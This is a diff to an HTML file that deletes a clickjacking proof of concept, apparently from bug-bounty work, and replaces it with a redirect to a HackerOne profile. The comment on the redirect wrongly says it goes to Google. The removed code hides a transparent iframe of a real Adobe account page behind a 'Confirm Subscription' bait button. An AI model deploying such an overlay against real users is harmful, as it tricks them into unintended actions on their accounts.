@@ -1,48 +1,12 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Sensitive Data Harvesting PoC</title>
-    <style>
-        .hidden-iframe {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            opacity: 0;
-            z-index: 10;
-            pointer-events: none; /* Prevent user interaction */
-        }
-        .bait-button {
-            margin-top: 100px;
-            font-size: 20px;
-            padding: 15px 30px;
-            cursor: pointer;
-        }
-    </style>
+    <title>Redirecting...</title>
 </head>
 <body>
-    <h1>Confirm Your Subscription</h1>
-    <p>Click the button below to confirm:</p>
-    <button class="bait-button" onclick="startHarvest()">Confirm Subscription</button>
-
-    <iframe id="sensitiveIframe" class="hidden-iframe" src="https://account.adobe.com/" allow="payment"></iframe>
-
     <script>
-        function startHarvest() {
-            // Simulate user interaction or harvesting logic here
-            alert('Harvesting Sensitive Data...');
-            
-            // Example: Attempt to access contents (This won't work due to Same-Origin Policy but can demonstrate clickjacking)
-            const iframe = document.getElementById('sensitiveIframe');
-            try {
-                const iframeContent = iframe.contentWindow.document.body.innerText;
-                console.log('Iframe Content:', iframeContent);
-            } catch (err) {
-                console.error('Blocked by Same-Origin Policy');
-            }
-        }
+        // Redirect to Google
+        window.location.href = "https://hackerone.com/zhenwarx";
     </script>
 </body>
 </html>
